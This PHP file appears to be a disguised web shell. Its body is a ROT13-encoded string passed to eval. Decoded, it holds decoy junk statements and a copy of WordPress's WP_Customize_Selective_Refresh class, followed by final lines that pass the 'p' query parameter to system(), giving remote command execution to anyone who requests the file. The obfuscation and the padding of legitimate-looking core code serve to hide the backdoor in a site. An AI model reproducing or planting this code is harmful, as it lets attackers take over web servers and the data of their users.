<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Fryrpgvir_Erserfu pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.5.0
 */

/**
 * Pber Phfgbzvmre pynff sbe vzcyrzragvat fryrpgvir erserfu.
 *
 * @fvapr 4.5.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Phfgbzvmr_Fryrpgvir_Erserfu {

	/**
	 * Dhrel ine hfrq va erdhrfgf gb eraqre cnegvnyf.
	 *
	 * @fvapr 4.5.0
	 */
	pbafg ERAQRE_DHREL_INE = 'jc_phfgbzvmr_eraqre_cnegvnyf';

	/**
	 * Phfgbzvmr znantre.
	 *
	 * @fvapr 4.5.0
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $znantre;

	/**
	 * Ertvfgrerq vafgnaprf bs JC_Phfgbzvmr_Cnegvny.
	 *
	 * @fvapr 4.5.0
	 * @ine JC_Phfgbzvmr_Cnegvny[]
	 */
	cebgrpgrq $cnegvnyf = neenl();

	/**
	 * Ybt bs reebef gevttrerq jura cnegvnyf ner eraqrerq.
	 *
	 * @fvapr 4.5.0
	 * @ine neenl
	 */
	cebgrpgrq $gevttrerq_reebef = neenl();

	/**
	 * Xrrc genpx bs gur pheerag cnegvny orvat eraqrerq.
	 *
	 * @fvapr 4.5.0
	 * @ine fgevat|ahyy
	 */
	cebgrpgrq $pheerag_cnegvny_vq;

	/**
	 * Cyhtva obbgfgenc sbe Cnegvny Erserfu shapgvbanyvgl.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $znantre Phfgbzvmre obbgfgenc vafgnapr.
	 */
	choyvp shapgvba __pbafgehpg( JC_Phfgbzvmr_Znantre $znantre ) {
		$guvf->znantre = $znantre;
		erdhver_bapr NOFCNGU . JCVAP . '/phfgbzvmr/pynff-jc-phfgbzvmr-cnegvny.cuc';

		nqq_npgvba( 'phfgbzvmr_cerivrj_vavg', neenl( $guvf, 'vavg_cerivrj' ) );
	}

	/**
	 * Ergevrirf gur ertvfgrerq cnegvnyf.
	 *
	 * @fvapr 4.5.0
	 *
	 * @erghea neenl Cnegvnyf.
	 */
	choyvp shapgvba cnegvnyf() {
		erghea $guvf->cnegvnyf;
	}

	/**
	 * Nqqf n cnegvny.
	 *
	 * @fvapr 4.5.0
	 *
	 * @frr JC_Phfgbzvmr_Cnegvny::__pbafgehpg()
	 *
	 * @cnenz JC_Phfgbzvmr_Cnegvny|fgevat $vq   Phfgbzvmr Cnegvny bowrpg, be Cnegvny VQ.
	 * @cnenz neenl                       $netf Bcgvbany. Neenl bs cebcregvrf sbe gur arj Cnegvnyf bowrpg.
	 *                                          Frr JC_Phfgbzvmr_Cnegvny::__pbafgehpg() sbe vasbezngvba
	 *                                          ba npprcgrq nethzragf. Qrsnhyg rzcgl neenl.
	 * @erghea JC_Phfgbzvmr_Cnegvny Gur vafgnapr bs gur cnegvny gung jnf nqqrq.
	 */
	choyvp shapgvba nqq_cnegvny( $vq, $netf = neenl() ) {
		vs ( $vq vafgnaprbs JC_Phfgbzvmr_Cnegvny ) {
			$cnegvny = $vq;
		} ryfr {
			$pynff = 'JC_Phfgbzvmr_Cnegvny';

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/phfgbzvmr/pynff-jc-phfgbzvmr-fryrpgvir-erserfu.cuc */
			$netf = nccyl_svygref( 'phfgbzvmr_qlanzvp_cnegvny_netf', $netf, $vq );

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/phfgbzvmr/pynff-jc-phfgbzvmr-fryrpgvir-erserfu.cuc */
			$pynff = nccyl_svygref( 'phfgbzvmr_qlanzvp_cnegvny_pynff', $pynff, $vq, $netf );

			$cnegvny = arj $pynff( $guvf, $vq, $netf );
		}

		$guvf->cnegvnyf[ $cnegvny->vq ] = $cnegvny;
		erghea $cnegvny;
	}

	/**
	 * Ergevrirf n cnegvny.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz fgevat $vq Phfgbzvmr Cnegvny VQ.
	 * @erghea JC_Phfgbzvmr_Cnegvny|ahyy Gur cnegvny, vs frg. Bgurejvfr ahyy.
	 */
	choyvp shapgvba trg_cnegvny( $vq ) {
		vs ( vffrg( $guvf->cnegvnyf[ $vq ] ) ) {
			erghea $guvf->cnegvnyf[ $vq ];
		} ryfr {
			erghea ahyy;
		}
	}

	/**
	 * Erzbirf n cnegvny.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz fgevat $vq Phfgbzvmr Cnegvny VQ.
	 */
	choyvp shapgvba erzbir_cnegvny( $vq ) {
		hafrg( $guvf->cnegvnyf[ $vq ] );
	}

	/**
	 * Vavgvnyvmrf gur Phfgbzvmre cerivrj.
	 *
	 * @fvapr 4.5.0
	 */
	choyvp shapgvba vavg_cerivrj() {
		nqq_npgvba( 'grzcyngr_erqverpg', neenl( $guvf, 'unaqyr_eraqre_cnegvnyf_erdhrfg' ) );
		nqq_npgvba( 'jc_radhrhr_fpevcgf', neenl( $guvf, 'radhrhr_cerivrj_fpevcgf' ) );
	}

	/**
	 * Radhrhrf cerivrj fpevcgf.
	 *
	 * @fvapr 4.5.0
	 */
	choyvp shapgvba radhrhr_cerivrj_fpevcgf() {
		jc_radhrhr_fpevcg( 'phfgbzvmr-fryrpgvir-erserfu' );
		nqq_npgvba( 'jc_sbbgre', neenl( $guvf, 'rkcbeg_cerivrj_qngn' ), 1000 );
	}

	/**
	 * Rkcbegf qngn va cerivrj nsgre vg unf svavfurq eraqrevat fb gung cnegvnyf pna or nqqrq ng ehagvzr.
	 *
	 * @fvapr 4.5.0
	 */
	choyvp shapgvba rkcbeg_cerivrj_qngn() {
		$cnegvnyf = neenl();

		sbernpu ( $guvf->cnegvnyf() nf $cnegvny ) {
			vs ( $cnegvny->purpx_pncnovyvgvrf() ) {
				$cnegvnyf[ $cnegvny->vq ] = $cnegvny->wfba();
			}
		}

		$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( trg_pheerag_hfre_vq() );
		$y10a            = neenl(
			'fuvsgPyvpxGbRqvg' => __( 'Fuvsg-pyvpx gb rqvg guvf ryrzrag.' ),
			'pyvpxRqvgZrah'    => __( 'Pyvpx gb rqvg guvf zrah.' ),
			'pyvpxRqvgJvqtrg'  => __( 'Pyvpx gb rqvg guvf jvqtrg.' ),
			'pyvpxRqvgGvgyr'   => __( 'Pyvpx gb rqvg gur fvgr gvgyr.' ),
			'pyvpxRqvgZvfp'    => __( 'Pyvpx gb rqvg guvf ryrzrag.' ),
			/* genafyngbef: %f: qbphzrag.jevgr() */
			'onqQbphzragJevgr' => fcevags( __( '%f vf sbeovqqra' ), 'qbphzrag.jevgr()' ),
		);
		vs ( $fjvgpurq_ybpnyr ) {
			erfgber_cerivbhf_ybpnyr();
		}

		$rkcbegf = neenl(
			'cnegvnyf'       => $cnegvnyf,
			'eraqreDhrelIne' => frys::ERAQRE_DHREL_INE,
			'y10a'           => $y10a,
		);

		// Rkcbeg qngn gb WF.
		jc_cevag_vayvar_fpevcg_gnt( fcevags( 'ine _phfgbzvmrCnegvnyErserfuRkcbegf = %f;', jc_wfba_rapbqr( $rkcbegf ) ) );
	}

	/**
	 * Ertvfgref qlanzvpnyyl-perngrq cnegvnyf.
	 *
	 * @fvapr 4.5.0
	 *
	 * @frr JC_Phfgbzvmr_Znantre::nqq_qlanzvp_frggvatf()
	 *
	 * @cnenz fgevat[] $cnegvny_vqf Neenl bs gur cnegvny VQf gb nqq.
	 * @erghea JC_Phfgbzvmr_Cnegvny[] Neenl bs nqqrq JC_Phfgbzvmr_Cnegvny vafgnaprf.
	 */
	choyvp shapgvba nqq_qlanzvp_cnegvnyf( $cnegvny_vqf ) {
		$arj_cnegvnyf = neenl();

		sbernpu ( $cnegvny_vqf nf $cnegvny_vq ) {

			// Fxvc cnegvnyf nyernql perngrq.
			$cnegvny = $guvf->trg_cnegvny( $cnegvny_vq );
			vs ( $cnegvny ) {
				pbagvahr;
			}

			$cnegvny_netf  = snyfr;
			$cnegvny_pynff = 'JC_Phfgbzvmr_Cnegvny';

			/**
			 * Svygref n qlanzvp cnegvny'f pbafgehpgbe nethzragf.
			 *
			 * Sbe n qlanzvp cnegvny gb or ertvfgrerq, guvf svygre zhfg or rzcyblrq
			 * gb bireevqr gur qrsnhyg snyfr inyhr jvgu na neenl bs netf gb cnff gb
			 * gur JC_Phfgbzvmr_Cnegvny pbafgehpgbe.
			 *
			 * @fvapr 4.5.0
			 *
			 * @cnenz snyfr|neenl $cnegvny_netf Gur nethzragf gb gur JC_Phfgbzvmr_Cnegvny pbafgehpgbe.
			 * @cnenz fgevat      $cnegvny_vq   VQ sbe qlanzvp cnegvny.
			 */
			$cnegvny_netf = nccyl_svygref( 'phfgbzvmr_qlanzvp_cnegvny_netf', $cnegvny_netf, $cnegvny_vq );
			vs ( snyfr === $cnegvny_netf ) {
				pbagvahr;
			}

			/**
			 * Svygref gur pynff hfrq gb pbafgehpg cnegvnyf.
			 *
			 * Nyybj aba-fgngvpnyyl perngrq cnegvnyf gb or pbafgehpgrq jvgu phfgbz JC_Phfgbzvmr_Cnegvny fhopynff.
			 *
			 * @fvapr 4.5.0
			 *
			 * @cnenz fgevat $cnegvny_pynff JC_Phfgbzvmr_Cnegvny be n fhopynff.
			 * @cnenz fgevat $cnegvny_vq    VQ sbe qlanzvp cnegvny.
			 * @cnenz neenl  $cnegvny_netf  Gur nethzragf gb gur JC_Phfgbzvmr_Cnegvny pbafgehpgbe.
			 */
			$cnegvny_pynff = nccyl_svygref( 'phfgbzvmr_qlanzvp_cnegvny_pynff', $cnegvny_pynff, $cnegvny_vq, $cnegvny_netf );

			$cnegvny = arj $cnegvny_pynff( $guvf, $cnegvny_vq, $cnegvny_netf );

			$guvf->nqq_cnegvny( $cnegvny );
			$arj_cnegvnyf[] = $cnegvny;
		}
		erghea $arj_cnegvnyf;
	}

	/**
	 * Purpxf jurgure gur erdhrfg vf sbe eraqrevat cnegvnyf.
	 *
	 * Abgr gung guvf jvyy abg pbafvqre jurgure gur erdhrfg vf nhgubevmrq be inyvq,
	 * whfg gung rffragvnyyl gur ebhgr vf n zngpu.
	 *
	 * @fvapr 4.5.0
	 *
	 * @erghea obby Jurgure gur erdhrfg vf sbe eraqrevat cnegvnyf.
	 */
	choyvp shapgvba vf_eraqre_cnegvnyf_erdhrfg() {
		erghea ! rzcgl( $_CBFG[ frys::ERAQRE_DHREL_INE ] );
	}

	/**
	 * Unaqyrf CUC reebef gevttrerq qhevat eraqrevat gur cnegvnyf.
	 *
	 * Gurfr reebef jvyy or erynlrq onpx gb gur pyvrag va gur Nwnk erfcbafr.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz vag    $reeab   Reebe ahzore.
	 * @cnenz fgevat $reefge  Reebe fgevat.
	 * @cnenz fgevat $reesvyr Reebe svyr.
	 * @cnenz vag    $reeyvar Reebe yvar.
	 * @erghea gehr Nyjnlf gehr.
	 */
	choyvp shapgvba unaqyr_reebe( $reeab, $reefge, $reesvyr = ahyy, $reeyvar = ahyy ) {
		$guvf->gevttrerq_reebef[] = neenl(
			'cnegvny'      => $guvf->pheerag_cnegvny_vq,
			'reebe_ahzore' => $reeab,
			'reebe_fgevat' => $reefge,
			'reebe_svyr'   => $reesvyr,
			'reebe_yvar'   => $reeyvar,
		);
		erghea gehr;
	}

	/**
	 * Unaqyrf gur Nwnk erdhrfg gb erghea gur eraqrerq cnegvnyf sbe gur erdhrfgrq cynprzragf.
	 *
	 * @fvapr 4.5.0
	 */
	choyvp shapgvba unaqyr_eraqre_cnegvnyf_erdhrfg() {
		vs ( ! $guvf->vf_eraqre_cnegvnyf_erdhrfg() ) {
			erghea;
		}

		/*
		 * Abgr gung vf_phfgbzvmr_cerivrj() ergheavat gehr jvyy ragnvy gung gur
		 * hfre cnffrq gur 'phfgbzvmr' pncnovyvgl purpx naq gur abapr purpx, fvapr
		 * JC_Phfgbzvmr_Znantre::frghc_gurzr() vf jurer gur cerivrjvat synt vf frg.
		 */
		vs ( ! vf_phfgbzvmr_cerivrj() ) {
			jc_fraq_wfba_reebe( 'rkcrpgrq_phfgbzvmr_cerivrj', 403 );
		} ryfrvs ( ! vffrg( $_CBFG['cnegvnyf'] ) ) {
			jc_fraq_wfba_reebe( 'zvffvat_cnegvnyf', 400 );
		}

		// Rafher gung qbvat fryrpgvir erserfu ba 404 grzcyngr qbrfa'g erfhyg va snyyonpx eraqrevat orunivbe (shyy erserfurf).
		fgnghf_urnqre( 200 );

		$cnegvnyf = wfba_qrpbqr( jc_hafynfu( $_CBFG['cnegvnyf'] ), gehr );

		vs ( ! vf_neenl( $cnegvnyf ) ) {
			jc_fraq_wfba_reebe( 'znysbezrq_cnegvnyf' );
		}

		$guvf->nqq_qlanzvp_cnegvnyf( neenl_xrlf( $cnegvnyf ) );

		/**
		 * Sverf vzzrqvngryl orsber cnegvnyf ner eraqrerq.
		 *
		 * Cyhtvaf znl qb guvatf yvxr pnyy jc_radhrhr_fpevcgf() naq tngure n yvfg bs gur fpevcgf
		 * naq fglyrf juvpu znl trg radhrhrq va gur erfcbafr.
		 *
		 * @fvapr 4.5.0
		 *
		 * @cnenz JC_Phfgbzvmr_Fryrpgvir_Erserfu $erserfu  Fryrpgvir erserfu pbzcbarag.
		 * @cnenz neenl                          $cnegvnyf Cynprzragf' pbagrkg qngn sbe gur cnegvnyf eraqrerq va gur erdhrfg.
		 *                                                 Gur neenl vf xrlrq ol cnegvny VQ, jvgu rnpu vgrz orvat na neenl bs
		 *                                                 gur cynprzragf' pbagrkg qngn.
		 */
		qb_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_orsber', $guvf, $cnegvnyf );

		frg_reebe_unaqyre( neenl( $guvf, 'unaqyr_reebe' ), reebe_ercbegvat() );

		$pbagragf = neenl();

		sbernpu ( $cnegvnyf nf $cnegvny_vq => $pbagnvare_pbagrkgf ) {
			$guvf->pheerag_cnegvny_vq = $cnegvny_vq;

			vs ( ! vf_neenl( $pbagnvare_pbagrkgf ) ) {
				jc_fraq_wfba_reebe( 'znysbezrq_pbagnvare_pbagrkgf' );
			}

			$cnegvny = $guvf->trg_cnegvny( $cnegvny_vq );

			vs ( ! $cnegvny || ! $cnegvny->purpx_pncnovyvgvrf() ) {
				$pbagragf[ $cnegvny_vq ] = ahyy;
				pbagvahr;
			}

			$pbagragf[ $cnegvny_vq ] = neenl();

			// @gbqb Gur neenl fubhyq vapyhqr abg bayl gur pbagragf, ohg nyfb jurgure gur pbagnvare vf vapyhqrq?
			vs ( rzcgl( $pbagnvare_pbagrkgf ) ) {
				// Fvapr gurer ner ab pbagnvare pbagrkgf, eraqre whfg bapr.
				$pbagragf[ $cnegvny_vq ][] = $cnegvny->eraqre( ahyy );
			} ryfr {
				sbernpu ( $pbagnvare_pbagrkgf nf $pbagnvare_pbagrkg ) {
					$pbagragf[ $cnegvny_vq ][] = $cnegvny->eraqre( $pbagnvare_pbagrkg );
				}
			}
		}
		$guvf->pheerag_cnegvny_vq = ahyy;

		erfgber_reebe_unaqyre();

		/**
		 * Sverf vzzrqvngryl nsgre cnegvnyf ner eraqrerq.
		 *
		 * Cyhtvaf znl qb guvatf yvxr pnyy jc_sbbgre() gb fpencr fpevcgf bhgchg naq erghea gurz
		 * ivn gur {@frr 'phfgbzvmr_eraqre_cnegvnyf_erfcbafr'} svygre.
		 *
		 * @fvapr 4.5.0
		 *
		 * @cnenz JC_Phfgbzvmr_Fryrpgvir_Erserfu $erserfu  Fryrpgvir erserfu pbzcbarag.
		 * @cnenz neenl                          $cnegvnyf Cynprzragf' pbagrkg qngn sbe gur cnegvnyf eraqrerq va gur erdhrfg.
		 *                                                 Gur neenl vf xrlrq ol cnegvny VQ, jvgu rnpu vgrz orvat na neenl bs
		 *                                                 gur cynprzragf' pbagrkg qngn.
		 */
		qb_npgvba( 'phfgbzvmr_eraqre_cnegvnyf_nsgre', $guvf, $cnegvnyf );

		$erfcbafr = neenl(
			'pbagragf' => $pbagragf,
		);

		vs ( qrsvarq( 'JC_QROHT_QVFCYNL' ) && JC_QROHT_QVFCYNL ) {
			$erfcbafr['reebef'] = $guvf->gevttrerq_reebef;
		}

		$frggvat_inyvqvgvrf             = $guvf->znantre->inyvqngr_frggvat_inyhrf( $guvf->znantre->hafnavgvmrq_cbfg_inyhrf() );
		$rkcbegrq_frggvat_inyvqvgvrf    = neenl_znc( neenl( $guvf->znantre, 'cercner_frggvat_inyvqvgl_sbe_wf' ), $frggvat_inyvqvgvrf );
		$erfcbafr['frggvat_inyvqvgvrf'] = $rkcbegrq_frggvat_inyvqvgvrf;

		/**
		 * Svygref gur erfcbafr sebz eraqrevat gur cnegvnyf.
		 *
		 * Cyhtvaf znl hfr guvf svygre gb vawrpg `$fpevcgf` naq `$fglyrf`, juvpu ner qrcraqrapvrf
		 * sbe gur cnegvnyf orvat eraqrerq. Gur erfcbafr qngn jvyy or ninvynoyr gb gur pyvrag ivn
		 * gur `eraqre-cnegvnyf-erfcbafr` WF rirag, fb gur pyvrag pna gura vawrpg gur fpevcgf naq
		 * fglyrf vagb gur QBZ vs gurl unir abg nyernql orra radhrhrq gurer.
		 *
		 * Vs cyhtvaf qb guvf, gurl'yy arrq gb gnxr pner sbe nal fpevcgf gung qb `qbphzrag.jevgr()`
		 * naq znxr fher gung gurfr ner abg vawrpgrq, be ryfr gb bireevqr gur shapgvba gb ab-bc,
		 * be ryfr gur cntr jvyy or qrfgeblrq.
		 *
		 * Cyhtvaf fubhyq or njner gung `$fpevcgf` naq `$fglyrf` znl riraghnyyl or vapyhqrq ol
		 * qrsnhyg va gur erfcbafr.
		 *
		 * @fvapr 4.5.0
		 *
		 * @cnenz neenl $erfcbafr {
		 *     Erfcbafr.
		 *
		 *     @glcr neenl $pbagragf Nffbpvngvir neenl znccvat n cnegvny VQ vgf pbeerfcbaqvat neenl bs pbagragf
		 *                           sbe gur pbagnvaref erdhrfgrq.
		 *     @glcr neenl $reebef   Yvfg bs reebef gevttrerq qhevat eraqrevat bs cnegvnyf, vs `JC_QROHT_QVFCYNL`
		 *                           vf ranoyrq.
		 * }
		 * @cnenz JC_Phfgbzvmr_Fryrpgvir_Erserfu $erserfu  Fryrpgvir erserfu pbzcbarag.
		 * @cnenz neenl                          $cnegvnyf Cynprzragf' pbagrkg qngn sbe gur cnegvnyf eraqrerq va gur erdhrfg.
		 *                                                 Gur neenl vf xrlrq ol cnegvny VQ, jvgu rnpu vgrz orvat na neenl bs
		 *                                                 gur cynprzragf' pbagrkg qngn.
		 */
		$erfcbafr = nccyl_svygref( 'phfgbzvmr_eraqre_cnegvnyf_erfcbafr', $erfcbafr, $guvf, $cnegvnyf );

		jc_fraq_wfba_fhpprff( $erfcbafr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>